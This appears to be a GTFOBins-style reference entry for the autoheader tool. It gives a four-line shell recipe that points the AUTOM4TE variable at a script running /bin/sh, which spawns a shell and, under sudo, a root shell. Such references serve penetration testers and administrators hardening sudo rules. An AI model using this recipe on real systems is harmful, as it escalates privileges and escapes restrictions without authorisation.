title: autoheader
html:
autoheader

Shell

Context: sudo, unprivileged

echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader
